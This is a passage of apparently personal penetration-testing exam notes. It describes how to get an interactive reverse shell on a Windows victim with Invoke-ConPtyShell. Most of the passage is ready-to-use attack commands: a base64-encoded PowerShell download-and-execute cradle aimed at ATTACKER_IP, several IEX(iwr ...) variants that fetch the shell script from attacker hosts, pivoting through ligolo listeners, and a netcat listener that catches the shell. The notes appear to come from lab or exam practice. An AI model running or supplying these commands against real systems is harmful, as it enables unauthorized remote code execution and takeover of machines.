
```
httpserv -p 8000
```

2. Edit conpty.ps1 with your listening ip and port:
```
cp /tools/conpty.ps1 .
nano conpty.ps1

<snip>  
Invoke-ConPtyShell YOUR_IP  YOUR_PORT
```
notes draft:
```
   
[Oct 04, 2025 - 00:57:08 (EEST)] 10.10.16.52 exegol-exam /tools # printf "iwr 'http://ATTACKER_IP:PORT/Invoke-ConPty.ps1' -UseBasicParsing | iex" \  
 | iconv -f utf-8 -t utf-16le \  
 | base64 -w 0  
aQB3AHIAIAAnAGgAdAB0AHAAOgAvAC8AQQBUAFQAQQBDAEsARQBSAF8ASQBQADoAUABPAFIAVAAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAHwAIABpAGUAeAA=#                                                 
[Oct 04, 2025 - 01:11:00 (EEST)] 10.10.16.52 exegol-exam /tools # printf "iwr 'http://ATTACKER_IP:PORT/Invoke-ConPty.ps1' -UseBasicParsing | iex" \  
 | iconv -t utf-16le \       
 | base64 -w 0  
aQB3AHIAIAAnAGgAdAB0AHAAOgAvAC8AQQBUAFQAQQBDAEsARQBSAF8ASQBQADoAUABPAFIAVAAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAHwAIABpAGUAeAA=#                                                 
[Oct 04, 2025 - 01:11:09 (EEST)] 10.10.16.52 exegol-exam /tools # printf "iwr 'http://ATTACKER_IP:PORT/Invoke-ConPty.ps1' -UseBasicParsing | iex" \  
 | iconv -t utf-16le \  
 | base64 -w 0
```

3. Call the script from victim:
```powershell
# basic attempt:
IEX(iwr http://10.10.16.42:8000/conpty.ps1)

# wrapping in powershell.exe
powershell.exe IEX(iwr http://10.10.16.42:8000/conpty.ps1 -UseBasicParsing)

# wrapping powershell in cmd

cmd.exe /c 'powershell.exe IEX(iwr http://10.10.16.42:8000/conpty.ps1 -UseBasicParsing)'

# trying different qoutes:
cmd.exe /c 'powershell.exe "IEX(iwr http://10.10.16.42:8000/conpty.ps1 -UseBasicParsing)"'
```
if they fail:
- ensure the ip points to your machine or if you are pivotting, make the script to both download and to connect back point to pivot host and then add listener on the pivot host for two different ports 
1. which will be used for web connection to download the script (1. make iwr point to pivot host on port 1337  add ligolo listener for web port 1337)
2. which will be used by the pivot host to redirect traffic for for conpty shell to attacker (edit conpty.ps1 with internal network address, add ligolo listener 1338)

note: i modified conpty invoke command by hardcoding the connection command at the bottom.
## Notes old
```
iex(iwr -Uri http://172.16.8.120:1337/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.8.120 1338
```

```
Invoke-WebRequest http://172.16.8.120:9001/Invoke-ConPtyShell.ps1 -UseBasicParsing -Outfile Invoke-ConPtyShell.ps1
```
server side
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```
